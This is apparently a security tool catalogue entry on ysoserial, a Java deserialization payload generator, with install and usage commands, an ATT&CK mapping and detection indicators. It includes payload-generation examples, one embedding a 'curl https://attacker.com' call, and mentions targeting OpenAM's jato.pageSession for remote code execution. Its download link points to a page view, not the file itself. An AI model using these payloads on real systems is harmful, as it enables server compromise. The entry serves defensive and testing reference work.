---
id: tool-uuid-001
url: >-
  https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar
tags:
  - deserialization
  - rce
type: tool
verified: false
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.120Z'
validated: true
submitted: true
---
# Ysoserial

**Status**: Unverified

## Overview

Ysoserial is a Java deserialization payload generator used in security testing to create exploits for unsafe deserialization vulnerabilities, commonly in web applications like ForgeRock OpenAM (CVE-2021-35464).

## Description

It supports various gadget chains (e.g., Click1, CommonsCollections) to chain deserialization into RCE by executing arbitrary commands. In offensive operations, it's used to craft payloads for injection into parameters like jato.pageSession, leading to server compromise.

## Features

- Feature 1: Multiple gadget chain support for different Java libraries
- Feature 2: Custom command execution payloads
- Feature 3: Binary serialization output for direct use in exploits

## Installation

### Requirements

- Java Runtime Environment (JRE 8+)
- wget or browser for download

### Install Commands

```bash
wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar
```

## Basic Usage

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
```

### Common Options

| Option | Description |
|--------|-------------|
| -jar | Path to the JAR file |
| GadgetName | Name of the gadget chain (e.g., Click1) |
| Command | Shell command to execute |

## Examples

### Example 1: Basic Usage

```bash
java -jar ysoserial.jar Click1 "calc.exe"
```

### Example 2: Advanced Usage

```bash
java -jar ysoserial.jar Click1 "curl https://attacker.com" > payload.bin
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploitation for Client Execution]]
- [[Exploit Public-Facing Application]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Java processes spawning with ysoserial.jar arguments
- Network downloads of ysoserial from GitHub
- Anomalous base64 outputs in temp files

## Related Procedures

- [[procedures/Generate-Deserialization-Payload-with-Ysoserial-for-RCE]]

## Related Tools

- [[Burp Suite]]

## References

- GitHub Repository: https://github.com/frohoff/ysoserial (original)
- PortSwigger Research on CVE-2021-35464
